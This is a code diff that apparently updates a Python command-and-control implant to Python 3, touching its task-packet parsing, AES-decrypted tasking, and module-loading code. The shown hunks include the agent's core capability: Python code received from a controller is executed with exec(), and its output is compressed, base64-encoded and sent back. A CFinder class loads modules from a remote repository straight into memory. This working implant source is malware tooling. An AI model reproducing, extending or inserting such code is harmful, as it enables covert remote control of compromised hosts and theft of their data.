@@ -11,7 +11,8 @@ import threading
 import http.server
 import zipfile
 import io
-import imp
+import importlib.util
+import types
 import re
 import shutil
 import pwd
@@ -132,7 +133,6 @@ def build_response_packet(taskingID, packetData, resultID=0):
         |  2   |         2          |    2     |    2    |   4    | <Length>  |
         +------+--------------------+----------+---------+--------+-----------+
     """
-
     packetType = struct.pack('=H', taskingID)
     totalPacket = struct.pack('=H', 1)
     packetNum = struct.pack('=H', 1)
@@ -186,8 +186,8 @@ def parse_task_packet(packet, offset=0):
         packetNum = struct.unpack('=H', packet[4+offset:6+offset])[0]
         resultID = struct.unpack('=H', packet[6+offset:8+offset])[0]
         length = struct.unpack('=L', packet[8+offset:12+offset])[0]
-        packetData = packet[12+offset:12+offset+length]
-        remainingData = packet[12+offset+length:]
+        packetData = packet[12+offset:12+offset+length].decode('UTF-8')
+        remainingData = packet[12+offset+length:].decode('UTF-8')
 
         return (packetType, totalPacket, packetNum, resultID, length, packetData, remainingData)
     except Exception as e:
@@ -202,8 +202,9 @@ def process_tasking(data):
     try:
         # aes_decrypt_and_verify is in stager.py
         tasking = aes_decrypt_and_verify(key, data)
+
         (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking)
-        
+
         # if we get to this point, we have a legit tasking so reset missedCheckins
         missedCheckins = 0
 
@@ -381,8 +382,6 @@ def process_packet(packetType, data, resultID):
             code_obj = compile(data, '<string>', 'exec')
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
-            code_obj = compile(data, '<string>', 'exec')
-            exec(code_obj, globals())
             results = buffer.getvalue()
             send_message(build_response_packet(100, str(results), resultID))
         except Exception as e:
@@ -400,15 +399,16 @@ def process_packet(packetType, data, resultID):
             code_obj = compile(data, '<string>', 'exec')
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
+            results = buffer.getvalue().encode('latin-1')
             c = compress()
-            start_crc32 = c.crc32_data(buffer.getvalue())
-            comp_data = c.comp_data(buffer.getvalue())
+            start_crc32 = c.crc32_data(results)
+            comp_data = c.comp_data(results)
             encodedPart = c.build_header(comp_data, start_crc32)
-            encodedPart = base64.b64encode(encodedPart)
+            encodedPart = base64.b64encode(encodedPart).decode('UTF-8')
             send_message(build_response_packet(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart, resultID))
         except Exception as e:
             # Also return partial code that has been executed
-            errorData = str(buffer.getvalue())
+            errorData = buffer.getvalue()
             send_message(build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID))
 
     elif packetType == 102:
@@ -594,7 +594,7 @@ class CFinder(object):
     def load_module(self, fullname):
         submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
         code = compile(source, fullpath, 'exec')
-        mod = sys.modules.setdefault(fullname, imp.new_module(fullname))
+        mod = sys.modules.setdefault(fullname, types.ModuleType(fullname))
         mod.__loader__ = self
         mod.__file__ = fullpath
         mod.__name__ = fullname
